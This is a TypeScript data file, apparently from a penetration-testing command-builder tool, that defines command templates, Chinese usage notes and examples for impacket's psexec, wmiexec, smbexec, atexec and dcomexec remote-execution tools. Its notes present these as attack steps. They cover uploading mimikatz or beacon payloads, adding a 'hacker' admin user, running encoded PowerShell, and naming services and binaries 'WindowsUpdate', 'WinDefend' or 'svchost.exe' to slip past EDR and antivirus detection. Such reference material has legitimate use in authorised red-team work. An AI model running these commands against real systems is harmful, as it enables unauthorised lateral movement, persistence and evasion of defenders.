import type { Tool } from '../../../types';
import { buildImpacketAuth, v } from '../../../lib/auth';

/**
 * 远程命令执行类 impacket 工具 (psexec/wmiexec/smbexec/atexec/dcomexec)
 * 参数定义来源为本机 impacket v0.14.0.dev0 --help 与官方 examples。
 * 参考: https://github.com/fortra/impacket/tree/master/examples
 *
 * 通用 target 格式: [[domain/]username[:password]@]<targetName or address>
 * 通用认证参数:   -hashes LMHASH:NTHASH | -k -no-pass | -aesKey <hex key> -k | -keytab
 * caps 差异:
 * - psexec/wmiexec/smbexec 支持 -target-ip
 * - atexec/dcomexec 不支持 -target-ip
 */
export const impacketExecTools: Tool[] = [
  {
    id: 'psexec',
    name: 'impacket-psexec',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/psexec.py',
    description: '通过 RemComSvc 服务在目标上执行命令，获取 SYSTEM 权限的交互式 shell',
    commands: [
      {
        id: 'psexec-shell',
        title: '交互式 Shell (默认 cmd.exe)',
        description: 'command 省略时默认执行 cmd.exe，上传 RemCom 服务二进制并启动服务获得 SYSTEM shell',
        build: (p) => `impacket-psexec ${buildImpacketAuth(p, { targetIp: true })}`,
        usage: `位置参数:
  target   [[domain/]username[:password]@]<targetName or address>，认证信息+目标
  command  要在目标执行的命令 (不含路径)，省略时默认为 cmd.exe 交互 shell
关键参数:
  -c pathname        复制本地文件到目标后执行，命令行参数由 command 位置参数传入
  -path PATH         指定远端执行时使用的路径
  -file FILE         使用自定义 RemCom 二进制替代内置版本 (需不依赖 CRT)
  -port [port]       连接目标 SMB 服务的端口 (默认 445)
  -service-name      指定触发 payload 的服务名 (混淆/免杀)
  -remote-binary-name 指定上传到目标的二进制文件名 (混淆/免杀)
认证参数: -hashes LMHASH:NTHASH / -k -no-pass / -aesKey <hex> -k / -keytab <file>
连接参数: -dc-ip 指定域控 IP；-target-ip 在目标主机名无法解析时指定目标 IP
其他: -codec 指定目标输出编码 (默认 utf-8)；-ts 日志加时间戳；-debug 调试输出`,
        example: 'impacket-psexec corp.local/administrator:Password123@192.168.1.10',
      },
      {
        id: 'psexec-command',
        title: '执行单条命令',
        description: 'command 为位置参数，跟在 target 之后',
        build: (p) => `impacket-psexec ${buildImpacketAuth(p, { targetIp: true })} whoami`,
        usage: `位置参数:
  target   [[domain/]username[:password]@]<targetName or address>
  command  要执行的命令 (不含路径)，如 whoami、hostname 等
说明:
  指定 command 后 psexec 只执行该命令并返回结果，不进入交互 shell
  命令通过 RemCom 服务以 SYSTEM 权限运行
关键参数:
  -path PATH  指定命令的远端执行路径 (命令在 PATH 之外时使用)
  -port [port]  SMB 目标端口
认证参数: -hashes / -k -no-pass / -aesKey -k / -keytab
连接参数: -dc-ip 域控 IP；-target-ip 目标主机名无法解析时的目标 IP`,
        example: 'impacket-psexec corp.local/administrator:Password123@192.168.1.10 whoami',
      },
      {
        id: 'psexec-upload-exec',
        title: '上传并执行可执行文件',
        description: '-c 复制本地文件到目标后执行，参数通过 command 位置参数传递',
        build: (p) => `impacket-psexec ${buildImpacketAuth(p, { targetIp: true })} -c ${v(p.fileName, 'FILE.EXE')}`,
        usage: `位置参数:
  target   [[domain/]username[:password]@]<targetName or address>
  command  使用 -c 时，此处为传给已上传程序的命令行参数
关键参数:
  -c pathname  要复制到目标并执行的本地文件路径
  -path PATH   指定文件在远端的落地/执行路径
  -remote-binary-name  指定 RemCom 二进制上传到目标后的文件名
说明:
  适合上传执行 mimikatz、CS beacon 等自有工具
  上传的文件会被复制到 ADMIN$ 共享 (C:\\Windows) 后执行
认证参数: -hashes / -k -no-pass / -aesKey -k / -keytab
连接参数: -dc-ip；-target-ip；-port`,
        example: 'impacket-psexec corp.local/administrator:Password123@192.168.1.10 -c /tmp/beacon.exe',
      },
      {
        id: 'psexec-custom-service',
        title: '自定义服务名与二进制名 (混淆/免杀)',
        description: '-service-name 指定服务名，-remote-binary-name 指定远端二进制名，降低特征匹配概率',
        build: (p) => `impacket-psexec ${buildImpacketAuth(p, { targetIp: true })} -service-name ${v('', 'SERVICE_NAME')} -remote-binary-name ${v('', 'BINARY_NAME')}`,
        usage: `关键参数:
  -service-name service_name        触发 payload 使用的服务名 (默认随机)
  -remote-binary-name remote_binary_name  上传到目标的可执行文件名 (默认随机)
说明:
  默认随机服务名/文件名可能被 EDR 规则命中，自定义为系统风格名称可降低告警
  仅改变命名特征，无法改变 RemCom 服务本身的行为特征
位置参数: target (认证+目标)；command (省略时默认 cmd.exe)
认证参数: -hashes / -k -no-pass / -aesKey -k / -keytab
连接参数: -dc-ip；-target-ip；-port`,
        example: 'impacket-psexec corp.local/administrator:Password123@192.168.1.10 -service-name WindowsUpdate -remote-binary-name svchost.exe',
      },
      {
        id: 'psexec-custom-remcom',
        title: '使用自定义 RemCom 二进制',
        description: '-file 使用自带 RemCom 二进制替代内置版本 (需不依赖 CRT)',
        build: (p) => `impacket-psexec ${buildImpacketAuth(p, { targetIp: true })} -file ${v(p.fileName, 'REMCOM.EXE')}`,
        usage: `关键参数:
  -file FILE  替代内置 RemComSvc 的自定义二进制，用于规避对内置二进制的静态检测
             注意: 二进制必须不依赖 CRT (C 运行时库)
说明:
  内置 RemCom 二进制已被多数杀软标记，重新编译修改后的 RemCom 可绕过静态特征
  配合 -service-name/-remote-binary-name 可进一步混淆
位置参数: target (认证+目标)；command (省略时默认 cmd.exe)
认证参数: -hashes / -k -no-pass / -aesKey -k / -keytab
连接参数: -dc-ip；-target-ip；-port`,
        example: 'impacket-psexec corp.local/administrator:Password123@192.168.1.10 -file /opt/remcom_custom.exe',
      },
    ],
  },
  {
    id: 'wmiexec',
    name: 'impacket-wmiexec',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/wmiexec.py',
    description: '通过 WMI (Win32_Process) 执行命令的半交互式 shell，默认不落地二进制',
    commands: [
      {
        id: 'wmiexec-shell',
        title: 'WMI 半交互式 Shell',
        description: 'command 省略时启动半交互式 shell，输出默认经 ADMIN$ 共享回传',
        build: (p) => `impacket-wmiexec ${buildImpacketAuth(p, { targetIp: true })}`,
        usage: `位置参数:
  target   [[domain/]username[:password]@]<targetName or address>
  command  要执行的命令，省略时启动半交互式 shell
关键参数:
  -share SHARE       回传命令输出使用的共享 (默认 ADMIN$)
  -nooutput          不获取命令输出 (不建立 SMB 连接，更隐蔽但无回显)
  -shell-type {cmd,powershell}  选择半交互 shell 使用的命令处理器
  -silentcommand     不通过 cmd.exe 直接执行给定命令 (无输出)
  -com-version MAJOR:MINOR  指定 DCOM 版本，如 5.7
认证参数: -hashes LMHASH:NTHASH / -k -no-pass / -aesKey <hex> -k / -keytab <file>
连接参数: -dc-ip 域控 IP；-target-ip 目标主机名无法解析时的目标 IP
其他: -A authfile 认证文件；-codec 输出编码 (默认 utf-8)；-ts 时间戳；-debug`,
        example: 'impacket-wmiexec corp.local/administrator:Password123@192.168.1.10',
      },
      {
        id: 'wmiexec-command',
        title: '执行单条命令',
        description: 'command 为位置参数，跟在 target 之后，输出经共享回传',
        build: (p) => `impacket-wmiexec ${buildImpacketAuth(p, { targetIp: true })} "ipconfig /all"`,
        usage: `位置参数:
  target   [[domain/]username[:password]@]<targetName or address>
  command  要执行的命令，如 "ipconfig /all" (含空格需加引号)
说明:
  命令经 WMI Win32_Process.Create 执行，输出先写入共享上的临时文件再读回
  相比 psexec 不创建服务、不上传二进制，对服务控制管理器日志更友好
关键参数:
  -share SHARE  回传输出使用的共享 (默认 ADMIN$，被封锁时可改 C$ 等)
认证参数: -hashes / -k -no-pass / -aesKey -k / -keytab
连接参数: -dc-ip；-target-ip`,
        example: 'impacket-wmiexec corp.local/administrator:Password123@192.168.1.10 "ipconfig /all"',
      },
      {
        id: 'wmiexec-powershell',
        title: '使用 PowerShell 处理器',
        description: '-shell-type powershell 选择 PowerShell 作为半交互 shell 的命令处理器',
        build: (p) => `impacket-wmiexec ${buildImpacketAuth(p, { targetIp: true })} -shell-type powershell`,
        usage: `关键参数:
  -shell-type {cmd,powershell}  选择半交互 shell 使用的命令处理器
说明:
  使用 powershell 处理器可直接执行 PowerShell 命令与脚本
  省略 command 位置参数时进入半交互 shell；也可指定单条命令
位置参数: target (认证+目标)；command (可选)
认证参数: -hashes / -k -no-pass / -aesKey -k / -keytab
连接参数: -dc-ip；-target-ip
其他: -share 指定输出回传共享；-codec 输出编码`,
        example: 'impacket-wmiexec corp.local/administrator:Password123@192.168.1.10 -shell-type powershell',
      },
      {
        id: 'wmiexec-nooutput',
        title: '无输出静默执行',
        description: '-nooutput 不获取输出 (不建立 SMB 连接)；-silentcommand 不经 cmd.exe 直接执行',
        build: (p) => `impacket-wmiexec ${buildImpacketAuth(p, { targetIp: true })} -nooutput whoami`,
        usage: `关键参数:
  -nooutput       不打印命令输出，执行后不建立 SMB 连接回读，更隐蔽
  -silentcommand  不通过 cmd.exe 直接执行给定命令 (无输出)
说明:
  -nooutput 适合执行无需回显的动作 (如添加用户、启动 payload 下载)
  -silentcommand 适合直接运行可执行文件路径，避免 cmd.exe 进程链
位置参数: target (认证+目标)；command (要执行的命令)
认证参数: -hashes / -k -no-pass / -aesKey -k / -keytab
连接参数: -dc-ip；-target-ip`,
        example: 'impacket-wmiexec corp.local/administrator:Password123@192.168.1.10 -nooutput "net user hacker P@ssw0rd /add"',
      },
      {
        id: 'wmiexec-custom-share',
        title: '自定义输出回传共享',
        description: '-share 指定输出回传使用的共享 (默认 ADMIN$)，共享被封锁时切换',
        build: (p) => `impacket-wmiexec ${buildImpacketAuth(p, { targetIp: true })} -share ${v('', 'SHARE')}`,
        usage: `关键参数:
  -share SHARE  回传命令输出使用的共享 (默认 ADMIN$)
说明:
  wmiexec 将命令输出重定向到该共享上的临时文件再经 SMB 读回
  ADMIN$ 被禁用或审计严格时可改用 C$ 等其他可写共享
  目标需允许对该共享的写入与读取
位置参数: target (认证+目标)；command (省略时进入半交互 shell)
认证参数: -hashes / -k -no-pass / -aesKey -k / -keytab
连接参数: -dc-ip；-target-ip`,
        example: 'impacket-wmiexec corp.local/administrator:Password123@192.168.1.10 -share C$',
      },
    ],
  },
  {
    id: 'smbexec',
    name: 'impacket-smbexec',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/smbexec.py',
    description: '通过 SMB 创建服务执行命令的半交互式 shell，不上传二进制文件',
    commands: [
      {
        id: 'smbexec-shell',
        title: 'SMBExec 半交互式 Shell',
        description: '默认 SHARE 模式，通过临时服务执行命令并经共享回传输出 (默认 C$)',
        build: (p) => `impacket-smbexec ${buildImpacketAuth(p, { targetIp: true })}`,
        usage: `位置参数:
  target  [[domain/]username[:password]@]<targetName or address> (无 command 位置参数)
关键参数:
  -share SHARE          回传输出使用的共享 (默认 C$)
  -mode {SHARE,SERVER}  执行模式: SHARE 经共享回传输出 (默认)；
                        SERVER 在本地起 SMB 服务器接收输出 (需要 root)
  -shell-type {cmd,powershell}  选择命令处理器
  -port [port]          连接目标 SMB 服务的端口
  -service-name         触发 payload 的服务名 (混淆)
认证参数: -hashes LMHASH:NTHASH / -k -no-pass / -aesKey <hex> -k / -keytab <file>
连接参数: -dc-ip 域控 IP；-target-ip 目标主机名无法解析时的目标 IP
其他: -codec 输出编码 (默认 utf-8)；-ts 时间戳；-debug`,
        example: 'impacket-smbexec corp.local/administrator:Password123@192.168.1.10',
      },
      {
        id: 'smbexec-server-mode',
        title: 'SERVER 模式 (本地 SMB 服务器回传)',
        description: '-mode SERVER 在攻击机本地起 SMB 服务器接收输出，需要 root，不依赖目标共享可写',
        build: (p) => `impacket-smbexec ${buildImpacketAuth(p, { targetIp: true })} -mode SERVER`,
        usage: `关键参数:
  -mode {SHARE,SERVER}  执行模式 (默认 SHARE)
    SHARE  在目标本地共享 (默认 C$) 写临时文件回传输出
    SERVER 在攻击机本地启动 SMB 服务器，目标回连写入输出 (需要 root 权限)
说明:
  SERVER 模式适用于目标共享不可写或 ADMIN$/C$ 被禁用的场景
  需要目标能回连攻击机的 445 端口
位置参数: target (认证+目标)
认证参数: -hashes / -k -no-pass / -aesKey -k / -keytab
连接参数: -dc-ip；-target-ip；-port`,
        example: 'impacket-smbexec corp.local/administrator:Password123@192.168.1.10 -mode SERVER',
      },
      {
        id: 'smbexec-powershell',
        title: '使用 PowerShell 处理器',
        description: '-shell-type powershell 选择 PowerShell 作为命令处理器',
        build: (p) => `impacket-smbexec ${buildImpacketAuth(p, { targetIp: true })} -shell-type powershell`,
        usage: `关键参数:
  -shell-type {cmd,powershell}  选择半交互 shell 使用的命令处理器
说明:
  使用 powershell 处理器可直接执行 PowerShell 命令与下载执行语句
  smbexec 通过创建临时服务执行命令，每条命令对应一次服务创建/删除
位置参数: target (认证+目标)
认证参数: -hashes / -k -no-pass / -aesKey -k / -keytab
连接参数: -dc-ip；-target-ip；-port
其他: -share 输出回传共享；-mode 执行模式`,
        example: 'impacket-smbexec corp.local/administrator:Password123@192.168.1.10 -shell-type powershell',
      },
      {
        id: 'smbexec-custom-service',
        title: '自定义服务名与输出共享 (混淆)',
        description: '-service-name 指定服务名，-share 指定输出回传共享，降低特征匹配概率',
        build: (p) => `impacket-smbexec ${buildImpacketAuth(p, { targetIp: true })} -service-name ${v('', 'SERVICE_NAME')} -share ${v('', 'SHARE')}`,
        usage: `关键参数:
  -service-name service_name  触发 payload 使用的服务名 (默认随机)
  -share SHARE                回传输出使用的共享 (默认 C$)
说明:
  smbexec 每条命令都会创建/删除一个服务，随机服务名易被规则命中
  自定义为系统风格服务名可降低告警；C$ 不可用时切换其他可写共享
位置参数: target (认证+目标)
认证参数: -hashes / -k -no-pass / -aesKey -k / -keytab
连接参数: -dc-ip；-target-ip；-port`,
        example: 'impacket-smbexec corp.local/administrator:Password123@192.168.1.10 -service-name WinDefend -share C$',
      },
    ],
  },
  {
    id: 'atexec',
    name: 'impacket-atexec',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/atexec.py',
    description: '通过任务计划程序 (Task Scheduler) 在目标上执行命令并回读输出',
    commands: [
      {
        id: 'atexec-command',
        title: '计划任务执行单条命令',
        description: '创建临时计划任务执行命令，输出经临时文件回读后删除任务',
        build: (p) => `impacket-atexec ${buildImpacketAuth(p)} whoami`,
        usage: `位置参数:
  target   [[domain/]username[:password]@]<targetName or address>
  command  要在目标执行的命令 (atexec 必须指定命令)
关键参数:
  -session-id SESSION_ID  在已存在的登录会话中执行 (无输出，不经 cmd.exe)
  -silentcommand          不通过 cmd.exe 直接执行给定命令 (无输出)
说明:
  通过 MS-TSCH 接口注册一次性计划任务执行命令
  输出写入 %SystemRoot%\\Temp 下随机文件后经 SMB 读回，任务随即删除
  注意: atexec 不支持 -target-ip，主机名无法解析时请直接用 IP 作为目标
认证参数: -hashes LMHASH:NTHASH / -k -no-pass / -aesKey <hex> -k / -keytab <file>
连接参数: -dc-ip 域控 IP
其他: -codec 输出编码 (默认 utf-8)；-ts 时间戳；-debug`,
        example: 'impacket-atexec corp.local/administrator:Password123@192.168.1.10 whoami',
      },
      {
        id: 'atexec-session-id',
        title: '指定登录会话执行 (无输出)',
        description: '-session-id 在已存在的登录会话中执行命令，无输出且不经 cmd.exe',
        build: (p) => `impacket-atexec ${buildImpacketAuth(p)} -session-id ${v('', 'SESSION_ID')} whoami`,
        usage: `关键参数:
  -session-id SESSION_ID  指定一个已存在的登录会话 ID，命令在该会话上下文中执行
                         此模式下无输出回传，且不通过 cmd.exe 执行
说明:
  适用于需要在特定用户桌面会话中运行程序的场景 (如弹出 GUI 进程)
  会话 ID 可通过 qwinsta/query session 在目标上查询
  因无输出，适合执行动作型命令而非信息收集
位置参数: target (认证+目标)；command (要执行的命令)
注意: atexec 不支持 -target-ip
认证参数: -hashes / -k -no-pass / -aesKey -k / -keytab
连接参数: -dc-ip`,
        example: 'impacket-atexec corp.local/administrator:Password123@192.168.1.10 -session-id 1 "C:\\beacon.exe"',
      },
      {
        id: 'atexec-silentcommand',
        title: '静默执行 (不经 cmd.exe)',
        description: '-silentcommand 不通过 cmd.exe 直接执行命令，无输出回传',
        build: (p) => `impacket-atexec ${buildImpacketAuth(p)} -silentcommand ${v('', 'COMMAND')}`,
        usage: `关键参数:
  -silentcommand  不通过 cmd.exe 直接执行给定命令 (无输出)
说明:
  直接以命令行启动进程，避免 cmd.exe /c 进程链，减少命令行审计特征
  无输出回传，适合执行下载、落地、启动类动作
  command 应为可直接运行的程序路径及参数
位置参数: target (认证+目标)；command (要执行的命令)
注意: atexec 不支持 -target-ip
认证参数: -hashes / -k -no-pass / -aesKey -k / -keytab
连接参数: -dc-ip`,
        example: 'impacket-atexec corp.local/administrator:Password123@192.168.1.10 -silentcommand "powershell -enc SQBFAFgA..."',
      },
    ],
  },
  {
    id: 'dcomexec',
    name: 'impacket-dcomexec',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/dcomexec.py',
    description: '通过 DCOM 对象 (ShellWindows 等) 执行命令的半交互式 shell，规避 WMI 检测',
    commands: [
      {
        id: 'dcomexec-shell',
        title: 'DCOM 半交互式 Shell',
        description: '默认使用 ShellWindows DCOM 对象执行命令，输出经 ADMIN$ 共享回传',
        build: (p) => `impacket-dcomexec ${buildImpacketAuth(p)}`,
        usage: `位置参数:
  target   [[domain/]username[:password]@]<targetName or address>
  command  要执行的命令，省略时启动半交互式 shell
关键参数:
  -object [{ShellWindows,ShellBrowserWindow,MMC20}]  用于执行命令的 DCOM 对象
         (默认 ShellWindows；MMC20 常被用于规避 WMI 检测)
  -share SHARE       回传输出使用的共享 (默认 ADMIN$)
  -nooutput          不获取命令输出 (不建立 SMB 连接)
  -shell-type {cmd,powershell}  选择命令处理器
  -silentcommand     不通过 cmd.exe 直接执行 (无输出，无法运行 dir/cd 等内建命令)
  -com-version MAJOR:MINOR  指定 DCOM 版本，如 5.7
认证参数: -hashes LMHASH:NTHASH / -k -no-pass / -aesKey <hex> -k / -keytab <file>
注意: dcomexec 不支持 -target-ip；连接参数仅 -dc-ip
其他: -A authfile 认证文件；-codec 输出编码；-ts 时间戳；-debug`,
        example: 'impacket-dcomexec corp.local/administrator:Password123@192.168.1.10',
      },
      {
        id: 'dcomexec-command',
        title: '执行单条命令',
        description: 'command 为位置参数，跟在 target 之后',
        build: (p) => `impacket-dcomexec ${buildImpacketAuth(p)} "ipconfig /all"`,
        usage: `位置参数:
  target   [[domain/]username[:password]@]<targetName or address>
  command  要执行的命令，如 "ipconfig /all" (含空格需加引号)
说明:
  命令经 DCOM 对象 (默认 ShellWindows) 的 ShellExecute 执行
  输出写入共享上的临时文件后经 SMB 读回
  不创建服务、不调用 WMI Win32_Process，绕过部分针对它们的检测
关键参数: -share 输出回传共享 (默认 ADMIN$)；-object 更换 DCOM 对象
注意: dcomexec 不支持 -target-ip
认证参数: -hashes / -k -no-pass / -aesKey -k / -keytab
连接参数: -dc-ip`,
        example: 'impacket-dcomexec corp.local/administrator:Password123@192.168.1.10 "ipconfig /all"',
      },
      {
        id: 'dcomexec-object',
        title: '指定 DCOM 对象 (MMC20)',
        description: '-object 更换用于执行的 DCOM 对象，ShellWindows 不可用时改用 MMC20 等',
        build: (p) => `impacket-dcomexec ${buildImpacketAuth(p)} -object MMC20`,
        usage: `关键参数:
  -object [{ShellWindows,ShellBrowserWindow,MMC20}]  用于执行命令的 DCOM 对象
    ShellWindows        默认对象，经 ShellExecute 执行
    ShellBrowserWindow  备选对象
    MMC20               经 MMC20.Application 的 ExecuteShellCommand 执行，常被用于规避 WMI 检测
说明:
  不同对象在目标上的可用性与被监控程度不同，一种被拦时可切换另一种
  MMC20 需要目标安装 MMC (一般 Windows 均自带)
位置参数: target (认证+目标)；command (省略时进入半交互 shell)
注意: dcomexec 不支持 -target-ip
认证参数: -hashes / -k -no-pass / -aesKey -k / -keytab
连接参数: -dc-ip`,
        example: 'impacket-dcomexec corp.local/administrator:Password123@192.168.1.10 -object MMC20',
      },
      {
        id: 'dcomexec-nooutput',
        title: '无输出静默执行',
        description: '-nooutput 不获取输出 (不建 SMB 连接)；-silentcommand 不经 cmd.exe 直接执行',
        build: (p) => `impacket-dcomexec ${buildImpacketAuth(p)} -nooutput "net user hacker P@ssw0rd /add"`,
        usage: `关键参数:
  -nooutput       不打印命令输出，执行后不建立 SMB 连接回读，更隐蔽
  -silentcommand  不通过 cmd.exe 直接执行命令 (无输出，无法运行 dir/cd 等 cmd 内建命令)
说明:
  适合执行无需回显的动作型命令 (添加用户、下载执行 payload 等)
  -silentcommand 下命令必须是可直接运行的程序路径，不能使用 cmd 内建命令
位置参数: target (认证+目标)；command (要执行的命令)
注意: dcomexec 不支持 -target-ip
认证参数: -hashes / -k -no-pass / -aesKey -k / -keytab
连接参数: -dc-ip`,
        example: 'impacket-dcomexec corp.local/administrator:Password123@192.168.1.10 -nooutput "net user hacker P@ssw0rd /add"',
      },
    ],
  },
];
